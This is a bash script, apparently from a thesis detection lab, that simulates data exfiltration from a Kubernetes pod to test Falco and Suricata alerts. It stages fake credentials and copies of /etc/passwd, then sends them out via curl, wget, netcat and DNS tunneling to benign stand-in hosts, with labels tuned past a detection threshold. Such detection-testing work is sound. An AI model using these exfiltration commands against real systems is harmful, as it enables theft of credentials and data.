#!/bin/bash
# Scenariul 7 - Data Exfiltration (T1048 / T1560 / T1071.004)
# Stage -> exfil prin curl (HTTPS), wget (HTTP), nc (raw TCP), DNS tunneling.
# Spre deosebire de scenariul 3, traficul iese spre internet -> cross-tool (Falco + Suricata).
# Prerequisite: pod-ul are curl, wget, dnsutils instalate (apt-get install -y curl wget dnsutils).

set -e

POD=attack-pod
NS=attack-target
source "$(dirname "$0")/../_env.sh"

# Endpoint-uri externe (benign echo / DNS public)
HTTP_ECHO=httpbin.org          # /post echo, suporta HTTP si HTTPS
RAW_TARGET=example.com         # raw TCP exfil pe :80
DNS_RESOLVER=8.8.8.8           # rezolver public -> declanseaza DNS Exfiltration rule
DNS_DOMAIN=exfil-thesis.example.com

echo "=================================================="
echo "Scenariul 7 - Data Exfiltration"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/5 - Stage & archive collected data (T1560)
# ---------------------------------------------------------------------------
echo "[step 1/5] Stage loot: fake creds + system files -> /tmp/loot.tar.gz"
kubectl exec -n $NS $POD -- bash -c '
  mkdir -p /tmp/loot
  echo "db_password=FAKE_thesis_demo_2026" > /tmp/loot/creds.txt
  echo "api_key=FAKE-AAAA-BBBB-CCCC-thesis" >> /tmp/loot/creds.txt
  cp /etc/passwd /etc/hostname /etc/os-release /tmp/loot/ 2>/dev/null || true
  tar czf /tmp/loot.tar.gz -C /tmp/loot . 2>/dev/null
  ls -l /tmp/loot.tar.gz
  echo "size: $(wc -c < /tmp/loot.tar.gz) bytes, b64 len: $(base64 -w0 /tmp/loot.tar.gz | wc -c)"
'
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 2/5 - Exfil via curl POST over HTTPS (T1048.002 - Exfil over encrypted protocol)
# ---------------------------------------------------------------------------
echo "[step 2/5] curl -X POST --data-binary @loot.tar.gz https://$HTTP_ECHO/post"
kubectl exec -n $NS $POD -- bash -c "curl -s -m 10 -X POST --data-binary @/tmp/loot.tar.gz https://$HTTP_ECHO/post -o /tmp/r_https 2>&1; echo \"HTTP resp bytes: \$(wc -c < /tmp/r_https 2>/dev/null || echo 0)\""
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 3/5 - Exfil via wget POST over HTTP plaintext (T1048.003 + observabil Suricata)
# ---------------------------------------------------------------------------
echo "[step 3/5] wget --post-file=loot.tar.gz http://$HTTP_ECHO/post"
kubectl exec -n $NS $POD -- bash -c "wget -q -T 10 --post-file=/tmp/loot.tar.gz -O /tmp/r_http http://$HTTP_ECHO/post 2>&1; echo \"HTTP resp bytes: \$(wc -c < /tmp/r_http 2>/dev/null || echo 0)\""
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 4/5 - Exfil via raw TCP cu netcat (T1048.003 - Exfil over non-app-layer)
# ---------------------------------------------------------------------------
echo "[step 4/5] cat loot.tar.gz | nc -w 3 $RAW_TARGET 80 (raw TCP exfil)"
kubectl exec -n $NS $POD -- bash -c "timeout 6 bash -c 'cat /tmp/loot.tar.gz | nc -w 3 $RAW_TARGET 80' 2>&1 | head -2 || true"
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 5/5 - DNS exfiltration: loot encodat in label-uri DNS spre rezolver public (T1071.004)
# ---------------------------------------------------------------------------
echo "[step 5/5] DNS tunneling: base64(loot) -> chunks de 60 chars (>= pragul de 50 al regulii Suricata sid 1000012) -> nslookup .$DNS_DOMAIN @$DNS_RESOLVER"
# Label-uri de 60 caractere: peste pragul regulii NIDS sid 1000012 (pcre /^[^.]{50,}\./) si
# realist pentru tool-urile de DNS tunneling (iodine/dnscat2 folosesc label-uri lungi, max 63).
kubectl exec -n $NS $POD -- bash -c "
  D=\$(base64 -w0 /tmp/loot.tar.gz | tr '+/=' 'abc' | head -c 480)
  i=0
  for c in \$(echo \$D | fold -w60); do
    i=\$((i+1))
    nslookup -timeout=2 -type=A \$c.chunk\$i.$DNS_DOMAIN $DNS_RESOLVER 2>&1 | grep -E 'Server|NXDOMAIN|can.t find|name =' | head -1
  done
  echo \"sent \$i DNS exfil queries (label 60 chars)\"
"
echo ""

echo "=================================================="
echo "Atac terminat. Astept 45s pentru propagare ES (Suricata batch flush)..."
echo "=================================================="
sleep 45

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"log.level\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Alertele SURICATA declansate ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"suricata\"}},{\"term\":{\"event_type.keyword\":\"alert\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_signature\":{\"terms\":{\"field\":\"rule.name\",\"size\":25}},\"by_category\":{\"terms\":{\"field\":\"alert.category.keyword\",\"size\":15}},\"by_dest\":{\"terms\":{\"field\":\"destination.ip\",\"size\":15}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample 10 detectii Falco (cronologic) ==="
curl -s "$ES/security-*/_search?size=10" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule.name\",\"log.level\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('log',{}).get('level','?'):8}] {s.get('rule',{}).get('name','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo -n "Total Falco events: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""
echo -n "Total Suricata alerts: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"suricata\"}},{\"term\":{\"event_type.keyword\":\"alert\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "End: $(date +%T)"
